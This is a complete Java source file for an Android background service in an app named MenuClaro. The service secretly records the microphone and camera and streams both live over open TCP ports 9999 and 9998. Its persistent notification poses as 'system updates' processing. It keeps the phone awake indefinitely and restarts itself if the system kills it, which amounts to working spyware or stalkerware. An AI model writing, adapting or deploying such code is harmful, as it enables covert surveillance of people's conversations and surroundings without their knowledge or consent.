package com.menuclaro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.view.Surface;
import androidx.core.app.NotificationCompat;

import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class StreamService extends Service {

    public static boolean isRunning = false;

    private static final String CHANNEL_ID = "MenuClaroService";
    private static final int PORT_AUDIO = 9999;
    private static final int PORT_VIDEO = 9998;
    private static final int SAMPLE_RATE = 44100;
    private static final int WIDTH  = 640;
    private static final int HEIGHT = 480;

    // WakeLock para evitar que MIUI mate el servicio
    private PowerManager.WakeLock wakeLock;

    // Audio
    private AudioRecord audioRecord;
    private ServerSocket audioServerSocket;
    private Thread audioThread;

    // Video
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private ServerSocket videoServerSocket;
    private Thread videoThread;
    private volatile OutputStream videoOutputStream;
    private int currentCameraIndex = 0;
    private String[] cameraIds;

    private boolean streaming = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopSelf();
            return START_NOT_STICKY;
        }

        startForegroundNotification();
        acquireWakeLock();
        startStreaming();
        isRunning = true;

        return START_STICKY; // Se reinicia solo si el sistema lo mata
    }

    private void startForegroundNotification() {
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Servicios activos")
                .setContentText("Procesando actualizaciones del sistema...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
        startForeground(1, notification);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Servicios del sistema", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Servicios en segundo plano");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "MenuClaro::StreamWakeLock");
        wakeLock.acquire(); // Mantiene CPU activo indefinidamente
    }

    private void startStreaming() {
        streaming = true;
        startBackgroundThread();
        startAudioServer();
        startCamera();
    }

    // ───────── AUDIO ─────────
    private void startAudioServer() {
        audioThread = new Thread(() -> {
            while (streaming) {
                try {
                    audioServerSocket = new ServerSocket(PORT_AUDIO);
                    Socket client = audioServerSocket.accept();

                    int bufferSize = AudioRecord.getMinBufferSize(
                            SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO,
                            AudioFormat.ENCODING_PCM_16BIT);

                    audioRecord = new AudioRecord(
                            MediaRecorder.AudioSource.MIC,
                            SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO,
                            AudioFormat.ENCODING_PCM_16BIT,
                            bufferSize * 4);

                    audioRecord.startRecording();
                    OutputStream out = client.getOutputStream();
                    byte[] buffer = new byte[bufferSize];

                    while (streaming && !client.isClosed()) {
                        int read = audioRecord.read(buffer, 0, bufferSize);
                        if (read > 0) {
                            out.write(buffer, 0, read);
                            out.flush();
                        }
                    }

                    audioRecord.stop();
                    audioRecord.release();
                    client.close();
                    audioServerSocket.close();

                } catch (Exception e) {
                    // Reconectar automáticamente si falla
                    try { Thread.sleep(1000); } catch (InterruptedException ie) { break; }
                }
            }
        });
        audioThread.setDaemon(true);
        audioThread.start();
    }

    // ───────── VIDEO ─────────
    private void startCamera() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            cameraIds = manager.getCameraIdList();
        } catch (CameraAccessException e) {
            cameraIds = new String[]{"0"};
        }

        imageReader = ImageReader.newInstance(WIDTH, HEIGHT, ImageFormat.JPEG, 2);
        imageReader.setOnImageAvailableListener(reader -> {
            android.media.Image image = reader.acquireLatestImage();
            if (image == null) return;
            try {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                sendVideoFrame(bytes);
            } finally {
                image.close();
            }
        }, backgroundHandler);

        openCamera();
        startVideoServer();
    }

    private void openCamera() {
        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            String cameraId = cameraIds[currentCameraIndex];
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    startPreview();
                }
                @Override public void onDisconnected(CameraDevice camera) { camera.close(); }
                @Override public void onError(CameraDevice camera, int error) {
                    camera.close();
                    // Reintentar abrir cámara
                    backgroundHandler.postDelayed(() -> openCamera(), 2000);
                }
            }, backgroundHandler);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startPreview() {
        try {
            SurfaceTexture texture = new SurfaceTexture(0);
            texture.setDefaultBufferSize(WIDTH, HEIGHT);
            Surface dummySurface = new Surface(texture);
            Surface readerSurface = imageReader.getSurface();

            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(
                    CameraDevice.TEMPLATE_PREVIEW);
            builder.addTarget(readerSurface);

            cameraDevice.createCaptureSession(
                    Arrays.asList(dummySurface, readerSurface),
                    new CameraCaptureSession.StateCallback() {
                        @Override public void onConfigured(CameraCaptureSession session) {
                            captureSession = session;
                            try {
                                builder.set(CaptureRequest.CONTROL_MODE,
                                        CameraMetadata.CONTROL_MODE_AUTO);
                                builder.set(CaptureRequest.CONTROL_AE_MODE,
                                        CameraMetadata.CONTROL_AE_MODE_ON);
                                session.setRepeatingRequest(
                                        builder.build(), null, backgroundHandler);
                            } catch (CameraAccessException e) { e.printStackTrace(); }
                        }
                        @Override public void onConfigureFailed(CameraCaptureSession session) {}
                    }, backgroundHandler);
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void startVideoServer() {
        videoThread = new Thread(() -> {
            while (streaming) {
                try {
                    videoServerSocket = new ServerSocket(PORT_VIDEO);
                    Socket client = videoServerSocket.accept();
                    videoOutputStream = client.getOutputStream();
                    // Esperar hasta que el cliente se desconecte
                    while (streaming && !client.isClosed()) {
                        Thread.sleep(500);
                    }
                    videoOutputStream = null;
                    client.close();
                    videoServerSocket.close();
                } catch (Exception e) {
                    try { Thread.sleep(1000); } catch (InterruptedException ie) { break; }
                }
            }
        });
        videoThread.setDaemon(true);
        videoThread.start();
    }

    private void sendVideoFrame(byte[] jpegBytes) {
        if (videoOutputStream == null) return;
        try {
            int len = jpegBytes.length;
            byte[] header = new byte[]{
                (byte)(len >> 24), (byte)(len >> 16), (byte)(len >> 8), (byte)(len)
            };
            videoOutputStream.write(header);
            videoOutputStream.write(jpegBytes);
            videoOutputStream.flush();
        } catch (Exception e) {
            videoOutputStream = null;
        }
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) { e.printStackTrace(); }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        streaming = false;
        isRunning = false;

        try {
            if (captureSession != null) { captureSession.close(); captureSession = null; }
            if (cameraDevice != null) { cameraDevice.close(); cameraDevice = null; }
            if (imageReader != null) { imageReader.close(); imageReader = null; }
            if (audioServerSocket != null) audioServerSocket.close();
            if (videoServerSocket != null) videoServerSocket.close();
            if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); }
        } catch (Exception e) { e.printStackTrace(); }

        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        stopBackgroundThread();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
